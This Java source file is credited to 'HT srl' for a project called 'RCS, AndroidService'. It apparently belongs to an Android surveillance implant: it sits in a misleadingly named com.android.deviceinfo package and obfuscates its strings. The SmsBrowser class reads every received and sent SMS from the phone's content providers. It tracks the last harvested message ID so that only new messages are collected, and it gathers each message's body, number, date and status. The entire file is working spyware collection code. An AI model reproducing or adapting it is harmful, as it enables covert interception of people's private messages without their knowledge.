/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module.message;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Sms> list;

	private int id;
	int maxId = 0;

	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}

	public synchronized ArrayList<Sms> getSmsList(int lastManagedId) {
		list.clear();

		int maxRec = parse(M.d("content://sms/inbox"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
		int maxSent = parse(M.d("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$

		maxId = Math.max(maxRec, maxSent);

		return list;
	}

	public synchronized ArrayList<Sms> getLastSmsSent(int lastManagedId) {
		list.clear();

		maxId = parse(M.d("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$

		return list;
	}

	private int parse(String content, boolean sentState, int lastManagedId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (parse), lastManagedId: " + lastManagedId);
		}

		final String[] projection = new String[] { "*" };
		final Cursor c = Status.getAppContext().getContentResolver()
				.query(Uri.parse(content), projection, null, null, null);

		final int smsEntriesCount = c.getCount();
		int localMaxId = lastManagedId;

		if (c.moveToFirst() == false) {
			c.close();
			return localMaxId;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body, number;
			long date;
			boolean sentStatus;

			// These fields are needed
			try {
				id = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("_id")).toString());

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): id = " + id + " new maxId: " + maxId);
				}
				if (id <= lastManagedId) {
					continue;
				}

				localMaxId = Math.max(localMaxId, id);
				printColumnsSms(c);

				body = c.getString(c.getColumnIndexOrThrow(M.d("body"))).toString(); //$NON-NLS-1$
				number = c.getString(c.getColumnIndexOrThrow(M.d("address"))).toString(); //$NON-NLS-1$
				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(M.d("date"))).toString()); //$NON-NLS-1$

				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}

				c.close();
				return localMaxId;
			}

			final Sms s = new Sms(number, body, date, sentStatus);
			s.setId(id);

			// These fields are optional
			try {
				final String thread_id = c.getString(c.getColumnIndexOrThrow(M.d("thread_id"))); //$NON-NLS-1$
				s.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String protocol = c.getString(c.getColumnIndexOrThrow(M.d("protocol"))); //$NON-NLS-1$
				s.setProtocol(protocol);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String read = c.getString(c.getColumnIndexOrThrow(M.d("read"))); //$NON-NLS-1$
				s.setRead(read);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String status = c.getString(c.getColumnIndexOrThrow(M.d("status"))); //$NON-NLS-1$
				s.setStatus(status);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String type = c.getString(c.getColumnIndexOrThrow(M.d("type"))); //$NON-NLS-1$
				s.setType(type);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String reply_path = c.getString(c.getColumnIndexOrThrow(M.d("reply_path_present"))); //$NON-NLS-1$
				s.setReplyPath(reply_path);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			c.moveToNext();
			list.add(s);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) end, localMaxId: " + localMaxId);
			}

		}

		if (Cfg.DEBUG) {
			Check.asserts(localMaxId >= lastManagedId, " (parse) Assert failed");
		}

		try {
			if (c != null) {
				c.close();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) error closing cursor: " + ex);
			}
		}

		return localMaxId;
	}

	private void printColumnsSms(Cursor c) {
		for (int j = 0; j < c.getColumnCount(); j++) {
			final String name = c.getColumnName(j);
			final String value = c.getString(c.getColumnIndex(name));

			if (Cfg.DEBUG) {

				if (name.equals("body") || name.equals("body")) {
					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
				}
			}
		}

	}

	public int getMaxId() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getMaxId): " + maxId);
		}

		return maxId;
	}
}